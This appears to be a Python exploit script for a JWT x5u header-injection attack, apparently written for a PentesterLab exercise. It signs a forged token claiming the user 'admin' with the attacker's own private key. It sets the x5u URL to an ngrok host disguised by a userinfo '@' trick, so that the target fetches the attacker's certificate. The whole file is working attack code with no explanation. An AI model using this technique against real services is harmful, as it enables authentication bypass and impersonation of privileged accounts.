import base64
import json
from OpenSSL.crypto import FILETYPE_PEM, load_privatekey
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

#Loading Private key from file.
with open('private.pem', 'rb') as f:
    private_key_data = f.read()
    private_key = load_privatekey(FILETYPE_PEM, private_key_data)
    private_key= private_key.to_cryptography_key()

#Header
header= {
  "typ": "JWT",
  "alg": "RS256",
  "x5u": "http://ptl-5cc9b966-853bef94.libcurl.so@513c-2405-201-c015-615f-66d1-9150-3296-2317.in.ngrok.io/x509.json"
}
# New Payload
payload= "eyJ1c2VyIjoiYWRtaW4ifQ"

# Header + payload
data= base64.urlsafe_b64encode(bytes(json.dumps(header),encoding='utf8')).decode('utf8').rstrip("=")+"."+payload

# Getting signature with private key
sig=private_key.sign(bytes(data,encoding="utf8"),algorithm=hashes.SHA256(),padding=padding.PKCS1v15())

# Printing new JWT Token with base64 encoded signature
print(data+"."+base64.urlsafe_b64encode(sig).decode("utf8").rstrip("="))